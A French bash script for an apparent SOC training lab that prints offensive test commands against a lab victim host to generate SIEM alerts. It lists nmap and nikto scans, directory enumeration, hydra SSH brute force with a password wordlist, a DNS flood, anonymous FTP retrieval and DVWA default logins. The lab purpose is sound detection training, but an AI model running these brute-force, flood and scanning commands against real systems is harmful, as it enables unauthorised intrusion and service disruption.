#!/bin/bash
# Aide aux tests offensifs — lab SOC-RUN
# Usage: siem-tests.sh

VICTIME="${VICTIME_IP:-10.30.10.20}"
VICTIME_HOST="${VICTIME_HOST:-victime}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${GREEN}=====================================${NC}"
echo -e "${GREEN}   SOC-RUN — Aide aux tests         ${NC}"
echo -e "${GREEN}=====================================${NC}"
echo -e "Cible : ${CYAN}${VICTIME}${NC} (${VICTIME_HOST})"
echo ""

echo -e "${YELLOW}[0] Recon réseau${NC}"
echo "  ping -c 3 $VICTIME"
echo "  nmap -sS -sV -T4 $VICTIME"
echo ""

echo -e "${YELLOW}[1] HTTP — énumération${NC}"
echo "  gobuster dir -u http://$VICTIME -w /usr/share/wordlists/dirb/common.txt"
echo "  gobuster dir -u http://$VICTIME/dvwa -w /usr/share/wordlists/dirb/common.txt"
echo "  nikto -h http://$VICTIME"
echo "  curl -s http://$VICTIME/admin/"
echo "  curl -s http://$VICTIME/.git/HEAD"
echo ""

echo -e "${YELLOW}[2] SSH — brute force${NC}"
echo "  hydra -l root -p root ssh://$VICTIME"
echo "  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$VICTIME -t 4 -V"
echo ""

echo -e "${YELLOW}[3] DNS — flood / enum${NC}"
echo "  dns-flood.sh $VICTIME 500"
echo "  dnsrecon -d victime.local -n $VICTIME"
echo "  dig @$VICTIME www.victime.local +short"
echo ""

echo -e "${YELLOW}[4] FTP — anonyme${NC}"
echo "  ftp $VICTIME"
echo "  # login: anonymous  password: (vide)"
echo "  lftp -u anonymous, $VICTIME -e 'ls; get pub/flag.txt; bye'"
echo ""

echo -e "${YELLOW}[5] DVWA — appli web${NC}"
echo "  # Navigateur (hôte) : http://localhost:8080/dvwa"
echo "  # Depuis Kali      : http://$VICTIME/dvwa"
echo "  # Login DVWA       : admin / password"
echo ""
